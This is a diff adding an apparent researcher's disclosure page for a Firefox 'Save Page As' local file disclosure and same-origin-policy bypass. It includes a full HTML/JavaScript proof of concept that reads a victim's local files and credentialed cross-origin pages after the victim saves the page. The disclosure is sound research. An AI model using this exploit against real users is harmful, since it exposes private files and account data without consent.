@@ -1,0 +1,97 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Local File Disclosure and Same Origin Policy bypass - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Local File Disclosure and Same Origin Policy bypass</h1>
+<br>
+
+<p>
+It's possible to read external websites and any file on a victims computer using the 'Save Page As' functionality on Firefox.
+<br>
+This is reliant on Firefox's allowance of reading files in the same directory in the file: URI scheme. Which was deemed 'by design'.<br>
+You can do this with Google Chrome but you can't read the saved files, so Google did not consider this a bug. <br>
+
+</p>
+
+<h2>The PoC</h2>
+
+<p>
+The following is the original PoC reported:<br>
+
+<!-- HTML generated using hilite.me --><div class="qCode" style="overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;title&gt;</span>POC<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;link</span> <span style="color: #FF0000">rel=</span><span style="color: #0000FF">&quot;stylesheet&quot;</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&quot;file:///C://&quot;</span> <span style="color: #000080; font-weight: bold">/&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;link</span> <span style="color: #FF0000">rel=</span><span style="color: #0000FF">&quot;stylesheet&quot;</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&quot;https://www.facebook.com/&quot;</span> <span style="color: #000080; font-weight: bold">/&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;textarea</span> <span style="color: #FF0000">style=</span><span style="color: #0000FF">&quot;width: 434px; height: 310px;&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;facebook&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/textarea&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;textarea</span> <span style="color: #FF0000">style=</span><span style="color: #0000FF">&quot;width: 434px; height: 310px;&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;files&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/textarea&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;script </span><span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;application/javascript&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+        <span style="color: #000080; font-weight: bold">var</span> doQ = (q) =&gt; { <span style="color: #008800; font-style: italic">//Simple XMLHttpRequest</span>
+            <span style="color: #000080; font-weight: bold">try</span> {
+                <span style="color: #000080; font-weight: bold">var</span> oReq = <span style="color: #000080; font-weight: bold">new</span> XMLHttpRequest();
+                oReq.addEventListener(<span style="color: #0000FF">&quot;load&quot;</span>, <span style="color: #000080; font-weight: bold">function</span>(e) {
+                    console.dir(e)
+                });
+                oReq.open(<span style="color: #0000FF">&quot;GET&quot;</span>, q, <span style="color: #000080; font-weight: bold">false</span>);
+                oReq.send();
+            } <span style="color: #000080; font-weight: bold">catch</span> (e) {
+                alert(<span style="color: #0000FF">&#39;File not found or restricted.&#39;</span>)
+            };
+            <span style="color: #000080; font-weight: bold">return</span> oReq.response;
+        };
+        <span style="color: #000080; font-weight: bold">if</span> (location.protocol == <span style="color: #0000FF">&#39;file:&#39;</span>) {
+            facebook.value = doQ(<span style="color: #0000FF">&#39;./POC_files/a.htm&#39;</span>);
+            files.value = doQ(<span style="color: #0000FF">&#39;./POC_files/a&#39;</span>);
+        } <span style="color: #000080; font-weight: bold">else</span> {
+            alert(<span style="color: #0000FF">&#39;Please hit CTRL+S and save this page first then open it locally.&#39;</span>);
+        }
+    <span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+
+<br>
+
+<br>
+Basically, when there is a reference to any website or local file using something like a link tag, initially Firefox blocks these, however, when a user saves the webpage, the 'Save webpage as' part does not do any checks on whether the files being downloaded are legitimate.
+<br>
+After the files are downloaded, the folder they are in are predictable (same as title + _files) and so we are able to read a victims local files and external websites with full credentials.<br>
+
+<h2>Result Screenshot</h2>
+<img src="../qimg/bypass-screenshot3.png"/><br>
+<br>
+</p>
+<br>
+
+</p>
+
+</div>
+<br>
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
